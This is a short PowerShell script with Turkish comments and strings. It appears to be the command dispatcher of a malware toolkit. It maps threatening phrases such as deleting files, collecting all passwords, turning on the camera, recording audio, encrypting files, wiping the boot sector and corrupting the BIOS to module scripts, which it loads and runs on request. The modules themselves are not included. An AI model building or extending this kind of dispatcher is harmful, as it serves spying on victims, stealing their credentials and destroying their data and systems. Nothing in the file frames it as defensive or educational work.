# ============================================================
# EN – TEHDİT EYLEM EŞLEŞTİRİCİ
# ============================================================

$tehditEylem = @{
    "Ekranını karartıyorum." = { . ./modul_ekran_karart.ps1 }
    "Dosyalarını siliyorum." = { . ./modul_sistem_dosyasi_ye.ps1 }
    "Kameranı açıyorum." = { . ./modul_kamera_ac.ps1 }
    "Ses kaydı alıyorum." = { . ./modul_ses_kaydet.ps1 }
    "Tüm şifrelerini topluyorum." = { . ./modul_sifre_topla.ps1 }
    "Ekran görüntüsü çekiyorum." = { . ./modul_ekran_goruntu.ps1 }
    "Fareni ele geçiriyorum." = { . ./modul_fare_ele_gecir.ps1 }
    "Klavyeni bloke ediyorum." = { . ./modul_klavye_bloke.ps1 }
    "Sistem sesini patlatıyorum." = { . ./modul_ses_patlama.ps1 }
    "Görev çubuğunu gizliyorum." = { . ./modul_gorev_cubugu_gizle.ps1 }
    "Masaüstü arka planını değiştiriyorum." = { . ./modul_arka_plan_degistir.ps1 }
    "Tüm açık programları kapatıyorum." = { . ./modul_program_kapat.ps1 }
    "Diskini dolduruyorum." = { . ./modul_kaynak_doldur.ps1 }
    "BIOS ayarlarını bozuyorum." = { . ./modul_bios_boz.ps1 }
    "Boot sektörünü temizliyorum." = { . ./modul_boot_temizle.ps1 }
    "Sana virüs gönderiyorum." = { . ./modul_virus_gonder.ps1 }
    "Ekranını ters çeviriyorum." = { . ./modul_ekran_ters.ps1 }
    "Tüm dosyalarını şifreliyorum." = { . ./modul_dosya_sifrele.ps1 }
    "VPN'ini çalıyorum." = { . ./modul_vpn_cal.ps1 }
    "Monitörünü kapatıyorum." = { . ./modul_monitor_kapat.ps1 }
}

function TehditUygula {
    param($tehdit)
    if ($tehditEylem.ContainsKey($tehdit)) {
        Write-Host "[EN] Uygulanıyor: $tehdit" -ForegroundColor Red
        & $tehditEylem[$tehdit]
    } else {
        Write-Host "[EN] Bilinmeyen tehdit: $tehdit" -ForegroundColor Yellow
    }
}